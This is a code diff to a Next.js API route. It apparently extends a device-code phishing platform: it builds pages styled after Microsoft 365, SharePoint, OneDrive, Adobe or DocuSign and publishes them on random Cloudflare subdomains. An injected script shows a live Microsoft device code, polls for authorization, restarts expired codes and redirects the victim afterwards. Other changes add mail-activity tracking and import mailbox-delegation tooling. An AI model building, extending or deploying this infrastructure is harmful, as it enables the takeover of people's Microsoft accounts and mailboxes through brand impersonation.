@@ -7,12 +7,13 @@ import { z } from "zod";
 import { AccessRole } from "@/generated/prisma/client";
 import { apiError, ApiError, createSession, currentUser, requireCsrf, requirePermission, revokeCurrentSession, rolePermissions } from "@/lib/auth";
 import { audit } from "@/lib/audit";
-import { CloudflareError, cloudflareStatus, deleteDeployment, discoverCloudflare, publishDeployment, verifyCloudflare } from "@/lib/cloudflare";
+import { buildPageDesign, defaultBuilderConfiguration } from "@/lib/builder-designs";
+import { CloudflareError, type CloudflareCredentials, cloudflareStatus, deleteDeployment, discoverCloudflare, publishDeployment, verifyCloudflare } from "@/lib/cloudflare";
 import { config } from "@/lib/config";
 import { encrypt, hashSecret, randomAccessCode, randomHostnameLabel, sha256, verifySecret } from "@/lib/crypto";
 import { db } from "@/lib/db";
 import { pageDocumentSchema, renderPageDocument } from "@/lib/page-document";
-import { cloneDocument, getVisualTemplate, visualTemplates } from "@/lib/visual-templates";
+import { getVisualTemplate, visualTemplates } from "@/lib/visual-templates";
 import { changeMailboxPermission, exchangeConfiguration, ExchangeConfigurationError, ExchangeOperationError, getMailboxDelegation } from "@/lib/exchange";
 import { authorizationStatus, GraphError, graphFetch, MicrosoftReauthenticationRequired, startDeviceAuthorization } from "@/lib/microsoft";
 
@@ -46,7 +47,8 @@ export async function GET(request: NextRequest, context: { params: Promise<{ pat
 export async function POST(request: NextRequest, context: { params: Promise<{ path: string[] }> }) {
   try {
     const path = (await context.params).path;
-    if (!["auth/login", "outlook-launch/exchange"].includes(path.join("/"))) await requireCsrf(request);
+    const publicDeviceRestart = path[0] === "microsoft" && path[1] === "device" && path[3] === "restart";
+    if (!publicDeviceRestart && !["auth/login", "outlook-launch/exchange"].includes(path.join("/"))) await requireCsrf(request);
     return await route(request, path);
   } catch (error) {
     return handle(error);
@@ -88,7 +90,7 @@ async function route(request: NextRequest, path: string[]) {
   if (key === "GET /dashboard") return dashboard();
   if (key === "POST /microsoft/device/start") {
     const actor = await requirePermission("microsoft:manage");
-    const { pageProjectId } = z.object({ pageProjectId: z.string().optional() }).parse(await request.json().catch(() => ({})));
+    const { pageProjectId, deploymentId } = z.object({ pageProjectId: z.string().optional(), deploymentId: z.string().optional() }).parse(await request.json().catch(() => ({})));
     const { publicId, statusToken } = await startDeviceAuthorization(pageProjectId);
     await audit({
       actorId: actor.id,
@@ -97,12 +99,62 @@ async function route(request: NextRequest, path: string[]) {
       targetId: publicId,
       result: "SUCCESS",
     });
-    return Response.json({ sessionId: publicId, connectUrl: `/connect/${publicId}?token=${encodeURIComponent(statusToken)}` }, { status: 201 });
+    const connectUrl = `/connect/${publicId}?token=${encodeURIComponent(statusToken)}`;
+    let publishedConnectUrl: string | undefined;
+    let bridgeError: string | undefined;
+    if (pageProjectId && deploymentId) {
+      try {
+        publishedConnectUrl = await publishMicrosoftSessionPage({ pageProjectId, deploymentId, publicId, statusToken });
+        await audit({ actorId: actor.id, action: "microsoft.authorization.deployment_bound", targetType: "CloudflareDeployment", targetId: deploymentId, result: "SUCCESS", metadata: { authorizationSessionId: publicId } });
+      } catch (error) {
+        bridgeError = error instanceof Error ? error.message : "Cloudflare session binding failed";
+        await audit({ actorId: actor.id, action: "microsoft.authorization.deployment_bound", targetType: "CloudflareDeployment", targetId: deploymentId, result: "FAILURE", metadata: { authorizationSessionId: publicId } });
+      }
+    }
+    return Response.json({ sessionId: publicId, connectUrl, publishedConnectUrl, bridgeError }, { status: 201 });
   }
   if (path[0] === "microsoft" && path[1] === "device" && path[3] === "status" && request.method === "GET") {
     const status = await authorizationStatus(id.parse(path[2]), z.string().min(40).parse(request.nextUrl.searchParams.get("token")));
     if (!status) throw new ApiError(404, "Authorization session not found");
-    return Response.json({ authorization: status });
+    const headers: Record<string, string> = {};
+    const origin = request.headers.get("origin");
+    if (origin && status.pageProject?.id) {
+      try {
+        const hostname = new URL(origin).hostname;
+        const deployment = await db.cloudflareDeployment.findFirst({ where: { hostname, projectId: status.pageProject.id, status: "ACTIVE" }, select: { id: true } });
+        if (deployment) {
+          headers["Access-Control-Allow-Origin"] = origin;
+          headers.Vary = "Origin";
+        }
+      } catch { /* Invalid origins receive no CORS grant. */ }
+    }
+    return Response.json({ authorization: status }, { headers });
+  }
+  if (path[0] === "microsoft" && path[1] === "device" && path[3] === "restart" && request.method === "POST") {
+    enforceRateLimit(`device-restart:${request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ?? "unknown"}`);
+    const publicId = id.parse(path[2]);
+    const oldToken = z.string().min(40).parse(request.nextUrl.searchParams.get("token"));
+    const previous = await authorizationStatus(publicId, oldToken);
+    if (!previous?.pageProject?.id) throw new ApiError(404, "Authorization session not found");
+    if (!["EXPIRED", "FAILED", "CANCELLED"].includes(previous.status)) throw new ApiError(409, "Authorization can only be restarted after it ends");
+    const { publicId: nextPublicId, statusToken } = await startDeviceAuthorization(previous.pageProject.id);
+    const connectUrl = `/connect/${nextPublicId}?token=${encodeURIComponent(statusToken)}`;
+    const origin = request.headers.get("origin");
+    let publishedConnectUrl: string | undefined;
+    const headers: Record<string, string> = {};
+    if (origin) {
+      try {
+        const hostname = new URL(origin).hostname;
+        const deployment = await db.cloudflareDeployment.findFirst({ where: { hostname, projectId: previous.pageProject.id, status: "ACTIVE" }, select: { id: true } });
+        if (deployment) {
+          publishedConnectUrl = await publishMicrosoftSessionPage({ pageProjectId: previous.pageProject.id, deploymentId: deployment.id, publicId: nextPublicId, statusToken });
+          headers["Access-Control-Allow-Origin"] = origin;
+          headers.Vary = "Origin";
+        }
+      } catch { /* Invalid or unavailable deployment origins fall back to the app page. */ }
+    }
+    await audit({ action: "microsoft.authorization.restarted", targetType: "MicrosoftAuthorizationSession", targetId: nextPublicId, result: "SUCCESS", metadata: { previousSessionId: publicId } });
+    return Response.json({ connectUrl, publishedConnectUrl }, { status: 201, headers });
   }
   if (key === "GET /microsoft/accounts") {
     await requirePermission("microsoft:read");
@@ -235,7 +287,7 @@ async function login(request: NextRequest) {
 async function dashboard() {
   await requirePermission("microsoft:read");
   const now = new Date();
-  const [connections, activeAccessCodes, htmlProjects, activeDeployments, recentEvents] = await Promise.all([
+  const [connections, activeAccessCodes, htmlProjects, activeDeployments, recentEvents, recentDeployments, recentMailActivity] = await Promise.all([
     db.microsoftConnection.findMany({
       select: { id: true, authorizationStatus: true, displayName: true, userPrincipalName: true, lastSuccessfulGraphAt: true },
       orderBy: { connectedAt: "desc" },
@@ -244,6 +296,8 @@ async function dashboard() {
     db.htmlProject.count({ where: { status: { not: "ARCHIVED" } } }),
     db.cloudflareDeployment.count({ where: { status: "ACTIVE", OR: [{ expiresAt: null }, { expiresAt: { gt: now } }] } }),
     db.auditEvent.findMany({ orderBy: { createdAt: "desc" }, take: 8, include: { actor: { select: { displayName: true, email: true } } } }),
+    db.cloudflareDeployment.findMany({ orderBy: { createdAt: "desc" }, take: 5, include: { project: { select: { name: true } } } }),
+    db.auditEvent.findMany({ where: { action: { startsWith: "mail." } }, orderBy: { createdAt: "desc" }, take: 5, include: { actor: { select: { displayName: true, email: true } } } }),
   ]);
   const mailboxStats = await Promise.all(
     connections
@@ -281,6 +335,8 @@ async function dashboard() {
     },
     connections: connections.slice(0, 5),
     recentEvents,
+    recentDeployments,
+    recentMailActivity,
   });
 }
 
@@ -540,16 +596,17 @@ async function htmlProjectRoute(request: NextRequest, path: string[]) {
       orderBy: { updatedAt: "desc" },
       include: {
         createdBy: { select: { displayName: true, email: true } },
-        versions: { orderBy: { version: "desc" }, take: 1, select: { version: true, createdAt: true } },
+        versions: { orderBy: { version: "desc" }, take: 1, select: { version: true, createdAt: true, document: true } },
         deployments: { orderBy: { updatedAt: "desc" }, take: 1, select: { hostname: true, status: true, deployedAt: true } },
       },
     });
     return Response.json({ projects, templates: visualTemplates.map((template) => ({ id: template.id, name: template.name, category: template.category, description: template.description, layout: template.layout, accent: template.accent })) });
   }
   if (path.length === 1 && request.method === "POST") {
-    const input = z.object({ name: z.string().min(1).max(120), template: z.string().max(100).default("blank") }).parse(await request.json());
+    const input = z.object({ name: z.string().min(1).max(120), template: z.string().max(100).default("compact-card"), provider: z.enum(["microsoft365", "sharepoint", "onedrive", "adobe", "docusign", "company", "custom"]).default("microsoft365") }).parse(await request.json());
     const template = getVisualTemplate(input.template);
-    const document = cloneDocument(template.document);
+    const configuration = defaultBuilderConfiguration(template.id as Parameters<typeof defaultBuilderConfiguration>[0], input.provider);
+    const document = buildPageDesign(configuration);
     document.settings.title = input.name;
     const rendered = renderPageDocument(document);
     const project = await db.htmlProject.create({
@@ -608,12 +665,19 @@ async function htmlProjectRoute(request: NextRequest, path: string[]) {
   }
   if (request.method === "GET") return Response.json({ project });
   if (path[2] === "versions" && request.method === "POST") {
-    const input = z.object({ document: pageDocumentSchema, customHtml: z.string().max(1_000_000).optional(), customCss: z.string().max(500_000).default(""), javascript: z.string().max(250_000).optional(), state: z.enum(["DRAFT", "PUBLISHED"]).default("DRAFT") }).parse(await request.json());
+    const input = z.object({ document: pageDocumentSchema, customHtml: z.string().max(1_000_000).optional(), customCss: z.string().max(500_000).refine((value) => !/[<>]/.test(value), "CSS cannot contain HTML delimiters").default(""), javascript: z.string().max(250_000).optional(), state: z.enum(["DRAFT", "PUBLISHED"]).default("DRAFT") }).parse(await request.json());
     const projectAssets = await db.projectAsset.findMany({ where: { projectId }, select: { id: true, contentType: true, data: true } });
     const embeddedAssets = new Map(projectAssets.map((asset) => [asset.id, `data:${asset.contentType};base64,${Buffer.from(asset.data).toString("base64")}`]));
     const rendered = renderPageDocument(input.document, { assetUrl: (assetId) => embeddedAssets.get(assetId) ?? "" });
+    const customHtml = sanitizeHtml(input.customHtml ?? "", {
+      allowedTags: [...sanitizeHtml.defaults.allowedTags, "section", "article", "header", "footer", "nav", "main"],
+      allowedAttributes: { "*": ["class", "id", "aria-label", "role"], a: ["href", "target", "rel"], img: ["src", "alt", "width", "height"] },
+      allowedSchemes: ["https", "http", "data"],
+      allowedSchemesByTag: { img: ["https", "data"] },
+      enforceHtmlBoundary: true,
+    });
     const nextVersion = (project.versions[0]?.version ?? 0) + 1;
-    const version = await db.htmlProjectVersion.create({ data: { projectId, version: nextVersion, html: `${rendered.html}${input.customHtml ?? ""}`, css: `${rendered.css}\n${input.customCss}`, javascript: input.javascript, document: input.document, editorId: actor.id, state: input.state } });
+    const version = await db.htmlProjectVersion.create({ data: { projectId, version: nextVersion, html: `${rendered.html}${customHtml}`, css: `${rendered.css}\n${input.customCss}`, javascript: undefined, document: input.document, editorId: actor.id, state: input.state } });
     await db.htmlProject.update({ where: { id: projectId }, data: { updatedAt: new Date(), settings: input.document.settings, status: input.state } });
     await audit({ actorId: actor.id, action: "html.project.version.created", targetType: "HtmlProject", targetId: projectId, result: "SUCCESS", metadata: { version: nextVersion } });
     return Response.json({ version }, { status: 201 });
@@ -748,22 +812,53 @@ async function cloudflareRoute(request: NextRequest, path: string[]) {
     return Response.json({ deployments });
   }
   if (path.length === 1 && request.method === "POST") {
-    const status = await cloudflareStatus();
-    if (!status.configured) throw new CloudflareError(503, "Configure Cloudflare before creating a deployment");
     const input = z.object({
       projectId: z.string().min(1),
-      policy: z.enum(["PUBLIC", "ACCESS_CODE"]).default("PUBLIC"),
+      policy: z.enum(["PUBLIC", "PRIVATE", "ACCESS_CODE"]).default("PUBLIC"),
       expiresAt: z.coerce.date().optional(),
       proposedHostname: z.string().max(255).optional(),
+      cloudflare: z.object({
+        authType: z.enum(["API_TOKEN", "GLOBAL_API_KEY"]),
+        email: z.string().email().optional(),
+        credential: z.string().min(20).max(500),
+        accountId: z.string().max(100),
+        zoneId: z.string().max(100),
+        baseDomain: z.string().max(255),
+        save: z.boolean().default(false),
+      }).optional(),
     }).parse(await request.json());
+    let runtimeCredentials: CloudflareCredentials | undefined;
+    let baseDomain: string | null;
+    if (input.cloudflare) {
+      const discovered = await discoverCloudflare(input.cloudflare);
+      const account = discovered.accounts.find((item) => item.id === input.cloudflare!.accountId);
+      const zone = discovered.zones.find((item) => item.id === input.cloudflare!.zoneId && item.account.id === input.cloudflare!.accountId);
+      if (!account || !zone) throw new ApiError(422, "Selected Cloudflare account or zone is not available");
+      if (input.cloudflare.baseDomain !== zone.name && !input.cloudflare.baseDomain.endsWith(`.${zone.name}`)) throw new ApiError(422, "Base domain must belong to the selected Cloudflare zone");
+      runtimeCredentials = { authType: input.cloudflare.authType, credential: input.cloudflare.credential, email: input.cloudflare.email, accountId: account.id, accountName: account.name, zoneId: zone.id, zoneName: zone.name, baseDomain: input.cloudflare.baseDomain };
+      baseDomain = input.cloudflare.baseDomain;
+      if (input.cloudflare.save) {
+        await db.cloudflareConfiguration.upsert({
+          where: { id: "default" },
+          create: { authType: input.cloudflare.authType, email: input.cloudflare.authType === "GLOBAL_API_KEY" ? input.cloudflare.email : null, encryptedCredential: encrypt(input.cloudflare.credential, "cloudflare:default"), accountId: account.id, accountName: account.name, zoneId: zone.id, zoneName: zone.name, baseDomain, lastTestedAt: new Date(), lastTestStatus: "SUCCESS" },
+          update: { authType: input.cloudflare.authType, email: input.cloudflare.authType === "GLOBAL_API_KEY" ? input.cloudflare.email : null, encryptedCredential: encrypt(input.cloudflare.credential, "cloudflare:default"), accountId: account.id, accountName: account.name, zoneId: zone.id, zoneName: zone.name, baseDomain, credentialKeyVersion: { increment: 1 }, lastTestedAt: new Date(), lastTestStatus: "SUCCESS" },
+        });
+        await audit({ actorId: actor.id, action: "cloudflare.configuration.saved", targetType: "CloudflareConfiguration", targetId: "default", result: "SUCCESS", metadata: { authType: input.cloudflare.authType, accountId: account.id, zoneId: zone.id, baseDomain } });
+      }
+    } else {
+      const status = await cloudflareStatus();
+      if (!status.configured) throw new CloudflareError(503, "Connect Cloudflare in the publish drawer before deploying");
+      baseDomain = status.baseDomain;
+    }
+    if (!baseDomain) throw new CloudflareError(503, "Cloudflare base domain is not configured");
     const project = await db.htmlProject.findUnique({ where: { id: input.projectId }, include: { versions: { orderBy: { version: "desc" }, take: 1 } } });
     if (!project?.versions[0]) throw new ApiError(404, "Project or project version not found");
     let hostname = input.proposedHostname?.toLowerCase().trim();
     if (hostname) {
-      if (!hostname.endsWith(`.${status.baseDomain}`) || !/^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\./.test(hostname)) throw new ApiError(422, `Hostname must be a valid subdomain of ${status.baseDomain}`);
+      if (!hostname.endsWith(`.${baseDomain}`) || !/^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\./.test(hostname)) throw new ApiError(422, `Hostname must be a valid subdomain of ${baseDomain}`);
       if (await db.cloudflareDeployment.findUnique({ where: { hostname } })) throw new ApiError(409, "That hostname is already in use. Generate another.");
     } else {
-      do { hostname = `${randomHostnameLabel()}.${status.baseDomain}`; }
+      do { hostname = `${randomHostnameLabel()}.${baseDomain}`; }
       while (await db.cloudflareDeployment.findUnique({ where: { hostname } }));
     }
     const plaintextCode = input.policy === "ACCESS_CODE" ? randomAccessCode() : undefined;
@@ -790,7 +885,7 @@ async function cloudflareRoute(request: NextRequest, path: string[]) {
       });
     }
     try {
-      await publishDeployment(hostname, deploymentPayload(deployment.id, project.versions[0], input.policy, plaintextCode, input.expiresAt));
+      await publishDeployment(hostname, deploymentPayload(deployment.id, project.versions[0], input.policy, plaintextCode, input.expiresAt), runtimeCredentials);
       await db.cloudflareDeployment.update({ where: { id: deployment.id }, data: { status: "ACTIVE", deployedAt: new Date() } });
       await audit({ actorId: actor.id, action: "cloudflare.deployment.created", targetType: "CloudflareDeployment", targetId: deployment.id, result: "SUCCESS", metadata: { hostname, policy: input.policy } });
       return Response.json({ deployment: { ...deployment, status: "ACTIVE" }, accessCode: plaintextCode }, { status: 201 });
@@ -810,7 +905,7 @@ async function cloudflareRoute(request: NextRequest, path: string[]) {
     } else {
       const latest = deployment.project.versions[0];
       if (!latest) throw new ApiError(422, "Project has no version to deploy");
-      const policy = deployment.accessPolicy as { type?: "PUBLIC" | "ACCESS_CODE"; codeHash?: string } | null;
+      const policy = deployment.accessPolicy as { type?: "PUBLIC" | "PRIVATE" | "ACCESS_CODE"; codeHash?: string } | null;
       await publishDeployment(deployment.hostname, {
         id: deployment.id,
         status: "ACTIVE",
@@ -838,7 +933,7 @@ async function cloudflareRoute(request: NextRequest, path: string[]) {
 function deploymentPayload(
   id: string,
   version: { html: string; css: string | null },
-  policy: "PUBLIC" | "ACCESS_CODE",
+  policy: "PUBLIC" | "PRIVATE" | "ACCESS_CODE",
   accessCode: string | undefined,
   expiresAt: Date | undefined,
 ) {
@@ -852,6 +947,51 @@ function deploymentPayload(
     accessCodeHash: accessCode ? sha256(accessCode) : undefined,
     expiresAt: expiresAt?.toISOString(),
   };
+}
+
+async function publishMicrosoftSessionPage(input: { pageProjectId: string; deploymentId: string; publicId: string; statusToken: string }) {
+  const deployment = await db.cloudflareDeployment.findFirst({
+    where: { id: input.deploymentId, projectId: input.pageProjectId, status: "ACTIVE" },
+    include: { project: { include: { versions: { orderBy: { version: "desc" }, take: 1 } } } },
+  });
+  if (!deployment?.project.versions[0]) throw new ApiError(404, "Active project deployment not found");
+  const session = await authorizationStatus(input.publicId, input.statusToken);
+  if (!session?.userCode || !session.verificationUri) throw new ApiError(409, "Microsoft device challenge is not ready");
+  const parsed = pageDocumentSchema.safeParse(deployment.project.versions[0].document);
+  if (!parsed.success) throw new ApiError(422, "The deployed project is not a visual Microsoft connection page");
+  const assets = await db.projectAsset.findMany({ where: { projectId: input.pageProjectId }, select: { id: true, contentType: true, data: true } });
+  const embedded = new Map(assets.map((asset) => [asset.id, `data:${asset.contentType};base64,${Buffer.from(asset.data).toString("base64")}`]));
+  const rendered = renderPageDocument(parsed.data, { deviceCode: session.userCode, verificationUri: session.verificationUri, status: session.status, assetUrl: (assetId) => embedded.get(assetId) ?? "" });
+  const base = config().APP_BASE_URL.replace(/\/$/, "");
+  const appUrl = new URL(base);
+  if (appUrl.protocol !== "https:") throw new ApiError(422, "Cloudflare session binding requires a public HTTPS APP_BASE_URL");
+  const origin = appUrl.origin;
+  const endpoint = `${base}/api/v1/microsoft/device/${encodeURIComponent(input.publicId)}/status?token=${encodeURIComponent(input.statusToken)}`;
+  const restartEndpoint = `${base}/api/v1/microsoft/device/${encodeURIComponent(input.publicId)}/restart?token=${encodeURIComponent(input.statusToken)}`;
+  const behavior = parsed.data.settings.builder;
+  const redirectUrl = behavior?.redirectUrl ?? "";
+  const redirectDelay = behavior?.redirectDelay === "immediate" ? 0 : behavior?.redirectDelay === "never" || !behavior?.redirectDelay ? -1 : Number(behavior.redirectDelay) * 1000;
+  const scriptNonce = randomBytes(18).toString("base64url");
+  const script = `(()=>{"use strict";const endpoint=${safeScriptJson(endpoint)},restartEndpoint=${safeScriptJson(restartEndpoint)},redirect=${safeScriptJson(redirectUrl)},delay=${redirectDelay};let code=${safeScriptJson(session.userCode)};const statusNodes=()=>document.querySelectorAll(".pb-status"),restartNodes=()=>document.querySelectorAll('[data-action="restart-authorization"]');restartNodes().forEach(node=>node.hidden=true);async function poll(){try{const response=await fetch(endpoint,{credentials:"omit",cache:"no-store"});if(!response.ok)throw new Error("status");const data=(await response.json()).authorization;code=data.userCode||code;document.querySelectorAll('[data-dynamic="microsoft-device-code"]').forEach(node=>node.textContent=code);const labels={PENDING:"Waiting for Microsoft authorization",CONNECTED:"Authorization complete",EXPIRED:"Authorization expired",FAILED:"Authorization failed",CANCELLED:"Authorization cancelled"};statusNodes().forEach(node=>{node.textContent=labels[data.status]||data.status;node.dataset.status=data.status.toLowerCase()});restartNodes().forEach(node=>node.hidden=!["EXPIRED","FAILED","CANCELLED"].includes(data.status));if(data.status==="CONNECTED"&&redirect&&delay>=0)setTimeout(()=>location.assign(redirect),delay);if(data.status==="PENDING")setTimeout(poll,3000)}catch{statusNodes().forEach(node=>node.textContent="Unable to check authorization status");setTimeout(poll,5000)}}document.addEventListener("click",async event=>{const target=event.target.closest("[data-action]");if(!target)return;if(target.dataset.action==="copy-device-code"){event.preventDefault();await navigator.clipboard.writeText(code)}if(target.dataset.action==="restart-authorization"){event.preventDefault();target.textContent="Restarting…";const response=await fetch(restartEndpoint,{method:"POST",credentials:"omit"});if(response.ok)location.reload();else target.textContent="Restart unavailable"}});poll()})();`;
+  const policy = deployment.accessPolicy as { type?: "PUBLIC" | "PRIVATE" | "ACCESS_CODE"; codeHash?: string } | null;
+  await publishDeployment(deployment.hostname, {
+    id: deployment.id,
+    status: "ACTIVE",
+    html: rendered.html,
+    css: rendered.css,
+    javascript: "",
+    systemScript: script,
+    scriptNonce,
+    connectOrigin: origin,
+    policy: policy?.type ?? "PUBLIC",
+    accessCodeHash: policy?.codeHash,
+    expiresAt: deployment.expiresAt?.toISOString(),
+  });
+  return `https://${deployment.hostname}`;
+}
+
+function safeScriptJson(value: string) {
+  return JSON.stringify(value).replaceAll("<", "\\u003c").replaceAll("\u2028", "\\u2028").replaceAll("\u2029", "\\u2029");
 }
 
 async function outlookLaunchRoute(request: NextRequest, path: string[]) {
